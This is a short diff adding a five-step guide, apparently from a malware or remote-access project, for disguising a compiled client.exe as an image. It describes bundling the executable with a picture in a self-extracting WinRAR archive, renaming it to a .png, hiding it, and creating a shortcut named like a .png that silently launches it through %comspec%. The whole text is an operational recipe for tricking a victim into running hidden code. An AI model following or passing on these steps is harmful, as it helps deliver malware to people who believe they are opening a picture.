@@ -1,0 +1,5 @@
+1. Compile the client.py
+2. Find an image
+3. With winrar create an sfx archive that runs image.png and client.exe
+4. Create a folder, put the archive, rename it to something.png and make it hidden
+5. Make a shortcut to something.png called somethingbis.png and which start %comspec% /c start "" "something.png"
